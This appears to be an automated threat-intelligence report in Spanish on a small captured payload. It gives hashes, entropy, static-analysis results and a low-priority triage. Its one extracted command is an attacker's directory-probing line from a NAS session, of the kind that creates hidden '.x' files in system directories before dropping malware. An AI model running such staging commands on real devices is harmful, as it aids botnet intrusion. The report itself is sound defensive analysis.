# 🧬 Payload Analysis

`c4e988590002ecbccc53c9313912283fff04313c731dd3b3adac3055e62ee0cd`

## 📌 Resumen

Artefacto de 854 B. Entropía registrada: 5.44. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.


## 🗓️ Registro

- **Registrado:** `2026-08-09T20:18:27.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c4e988590002ecbccc53c9313912283fff04313c731dd3b3adac3055e62ee0cd`
- **SHA1:** `1b9c59c34318edd9a38ff85b2b5667a4edaa4c6e`
- **MD5:** `011737e1d85df03dbf59b5d77b2cbe18`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 854 B |
| Entropía | 5.44 |
| Strings | 21 |

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=data; iocs=2

## 🖥️ Comandos observados / extraídos

```text
[4loperator@NAS326:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| command | [4loperator@NAS326:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd / | strings |
| hash | c4e988590002ecbccc53c9313912283fff04313c731dd3b3adac3055e62ee0cd | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
